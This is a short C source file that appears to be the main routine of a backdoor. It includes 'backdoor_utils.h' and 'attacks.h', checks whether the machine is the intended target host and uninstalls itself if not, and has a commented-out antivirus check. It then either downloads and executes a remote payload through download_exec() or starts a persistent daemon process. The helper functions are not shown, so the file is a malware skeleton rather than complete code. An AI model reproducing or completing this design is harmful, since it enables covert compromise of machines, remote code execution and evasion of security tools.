#include "backdoor_utils.h"
#include "utils.h"
#include "validators.h"
#include "attacks.h"


int main(void) {
	host_profile host_info;
	Validation_Status s;

	if((s = check_if_host_is_correct(&host_info)) != CORRECT_HOST) {
		#ifdef DEBUG
		fprintf(stderr, "Invalid Host: %s\n", get_validator_status_message(s));
		#endif
		uninstall();
		exit(s);
	}

	//check_for_antivirus();



	#ifdef DOWNLOAD_URL
	download_exec();
	#endif

	#if !defined(DOWNLOAD_URL)
	create_deamon_process();
	#endif

}